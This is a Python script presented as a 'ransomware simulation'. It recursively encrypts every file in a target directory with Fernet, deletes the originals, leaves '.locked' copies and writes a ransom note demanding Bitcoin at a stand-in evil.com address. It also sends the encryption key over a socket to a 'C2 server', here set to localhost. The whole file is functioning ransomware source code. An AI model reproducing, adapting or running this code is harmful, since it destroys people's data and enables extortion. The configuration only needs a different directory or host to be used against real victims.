import os
import base64
from cryptography.fernet import Fernet
import socket
import time

# Configuration
TARGET_DIR = r""  # Directory with target files
C2_SERVER = ("127.0.0.1", 2003)  # Local C2 server
RANSOM_NOTE = "payransom.txt"
ENCRYPTED_EXTENSION = ".locked"  # New extension for encrypted files

# Generate encryption key
key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt_files(directory):
    """Encrypt files in place, change extensions, and lock them."""
    print(f"Targeting files in: {directory}")
    if not os.path.exists(directory):
        print(f"Error: Directory {directory} does not exist!")
        return False
    
    encrypted_files = []
    files_found = False
    for root, dirs, files in os.walk(directory):
        print(f"Scanning -> Root: {root}, Dirs: {dirs}, Files: {files}")
        if not files:
            print("No files detected in this directory.")
        for file in files:
            files_found = True
            if file == RANSOM_NOTE or file.endswith(ENCRYPTED_EXTENSION):
                print(f"Skipping: {file}")
                continue
            original_path = os.path.join(root, file)
            encrypted_path = original_path + ENCRYPTED_EXTENSION  # New name with extension
            print(f"Encrypting: {original_path}")
            try:
                # Read original data
                with open(original_path, "rb") as f:
                    original_data = f.read()
                if not original_data:
                    print(f"Skipping empty file: {original_path}")
                    continue
                print(f"Read {len(original_data)} bytes from {original_path}")

                # Encrypt data
                encrypted_data = cipher.encrypt(original_data)
                
                # Write encrypted data to new file and delete original
                with open(encrypted_path, "wb") as f:
                    f.write(encrypted_data)
                os.remove(original_path)  # Replace original with encrypted version
                print(f"Encrypted and renamed to: {encrypted_path}")
                
                # Verify encryption
                with open(encrypted_path, "rb") as f:
                    encrypted_check = f.read()
                if encrypted_check != original_data:
                    print(f"Successfully locked: {encrypted_path}")
                    encrypted_files.append(encrypted_path)
                else:
                    print(f"Encryption failed for: {encrypted_path}")
                    return False
            except PermissionError:
                print(f"Permission denied for {original_path}")
            except Exception as e:
                print(f"Error encrypting {original_path}: {e}")
    
    if not files_found:
        print(f"No files found in {directory} to encrypt! Please add files to the directory.")
        return False
    if not encrypted_files:
        print(f"No files were encrypted in {directory}! All files were either empty or skipped.")
        return False
    return True

def drop_ransom_note():
    """Drop a ransom note with the decryption key."""
    try:
        note = f"""
        Your files have been encrypted and locked with the extension {ENCRYPTED_EXTENSION}!
        To decrypt them, use this key: {base64.b64encode(key).decode()}
        Send 1 BTC to fake_hacker@evil.com for instructions.
        Use a Fernet decryption tool with the key above to unlock your files.
        """
        ransom_path = os.path.join(TARGET_DIR, RANSOM_NOTE)
        with open(ransom_path, "w") as f:
            f.write(note)
        print(f"Ransom note created at: {ransom_path}")
    except Exception as e:
        print(f"Error creating ransom note: {e}")

def fake_c2_communication():
    """Send encryption key to C2 server with retry mechanism."""
    max_attempts = 5
    for attempt in range(max_attempts):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect(C2_SERVER)
                message = b"Encryption complete. Key: " + key
                s.sendall(message)
                print(f"Key sent to C2 server: {message.decode('utf-8', errors='ignore')}")
                return True
        except ConnectionRefusedError:
            print(f"C2 connection attempt {attempt + 1}/{max_attempts} failed: Connection refused")
            if attempt < max_attempts - 1:
                time.sleep(2)
        except Exception as e:
            print(f"C2 communication failed: {e}")
            break
    print("Failed to send key to C2 server after all attempts.")
    return False

def ensure_directory():
    """Ensure TARGET_DIR exists."""
    if not os.path.exists(TARGET_DIR):
        try:
            os.makedirs(TARGET_DIR)
            print(f"Created directory: {TARGET_DIR}")
        except Exception as e:
            print(f"Failed to create directory {TARGET_DIR}: {e}")
            exit(1)
    else:
        print(f"Directory already exists: {TARGET_DIR}")

def main():
    print("Ransomware simulation initiated...")
    ensure_directory()
    
    if os.path.exists(os.path.join(TARGET_DIR, RANSOM_NOTE)):
        print("Ransom note detected. Files may already be encrypted. Aborting to prevent re-encryption.")
        return
    
    if encrypt_files(TARGET_DIR):
        drop_ransom_note()
        fake_c2_communication()
        print("Simulation complete. Files are encrypted with .locked extension.")
        print("Use the key in payransom.txt with a decryption tool to recover your files.")
    else:
        print("Encryption process failed. Check logs above.")

if __name__ == "__main__":
    main()
